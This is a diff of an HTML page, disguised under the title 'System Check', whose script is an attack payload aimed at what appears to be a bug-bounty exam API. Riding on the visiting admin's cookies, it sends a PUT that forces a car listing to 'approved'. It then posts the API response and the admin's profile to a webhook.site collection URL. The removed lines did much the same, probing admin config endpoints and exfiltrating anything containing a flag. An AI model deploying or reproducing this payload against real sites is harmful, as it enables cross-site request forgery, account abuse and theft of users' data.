@@ -1,24 +1,60 @@
 <!DOCTYPE html>
 <html>
+<head><title>System Check</title></head>
 <body>
     <script>
-    // Instead of the dashboard, let's hunt for the 'System Config' 
-    // This is often where the 1000pt flag is hardcoded.
-    const targets = [
-        'https://api-bugbounty-exam.hashacademy.co/api/admin/config',
-        'https://api-bugbounty-exam.hashacademy.co/api/admin/env',
-        'https://api-bugbounty-exam.hashacademy.co/api/v1/debug'
-    ];
+        (async () => {
+            const webhook = "https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b";
+            const targetCar = "https://api-bugbounty-exam.hashacademy.co/api/cars/69dd69884e3edba5f08f60f9";
+            
+            const carUpdate = {
+                "make": "Pwned",
+                "model": "FlagSeeker",
+                "status": "approved", // Attempt to force state change
+                "isAvailable": true,
+                "description": "Exploit Triggered"
+            };
 
-    targets.forEach(url => {
-        fetch(url, {credentials: 'include'})
-            .then(r => r.text())
-            .then(data => {
-                if(data.includes('HASH')) {
-                    fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?flag=' + btoa(data));
-                }
-            });
-    });
-</script>
+            const formData = new FormData();
+            formData.append("carData", JSON.stringify(carUpdate));
+
+            try {
+                // Step 1: Perform the PUT request with Admin's credentials
+                const res = await fetch(targetCar, {
+                    method: "PUT",
+                    body: formData,
+                    credentials: "include"
+                });
+                const data = await res.json();
+
+                // Step 2: Send the API's response (with the Flag) to your webhook
+                await fetch(webhook, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({
+                        event: "CAR_APPROVED",
+                        apiResponse: data
+                    })
+                });
+
+                // Step 3: Bonus - Try to grab the Admin's full profile info too
+                const profileRes = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
+                    credentials: "include"
+                });
+                const profileData = await profileRes.json();
+                await fetch(webhook, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({
+                        event: "ADMIN_PROFILE_LEAK",
+                        profile: profileData
+                    })
+                });
+
+            } catch (e) {
+                fetch(webhook, { method: "POST", mode: "no-cors", body: "Error: " + e.message });
+            }
+        })();
+    </script>
 </body>
 </html>
